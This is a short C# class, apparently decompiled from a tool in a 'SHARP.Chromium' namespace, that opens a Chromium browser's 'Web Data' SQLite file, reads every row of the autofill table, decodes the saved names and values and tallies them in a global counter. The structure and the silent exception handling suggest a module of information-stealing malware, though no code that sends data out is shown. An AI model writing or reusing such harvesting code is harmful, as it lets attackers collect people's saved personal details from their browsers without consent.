﻿using System;
using System.Collections.Generic;

namespace SHARP.Chromium
{
	// Token: 0x0200007B RID: 123
	internal sealed class Autofill
	{
		// Token: 0x06000297 RID: 663 RVA: 0x000100DC File Offset: 0x0000E2DC
		public static List<AutoFill> Get(string sWebData)
		{
			List<AutoFill> list = new List<AutoFill>();
			try
			{
				SQLite sqlite = SqlReader.ReadTable(sWebData, "autofill");
				if (sqlite == null)
				{
					return list;
				}
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					AutoFill item = default(AutoFill);
					item.sName = Crypto.GetUTF8(sqlite.GetValue(i, 0));
					item.sValue = Crypto.GetUTF8(sqlite.GetValue(i, 1));
					Counting.AutoFill++;
					list.Add(item);
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
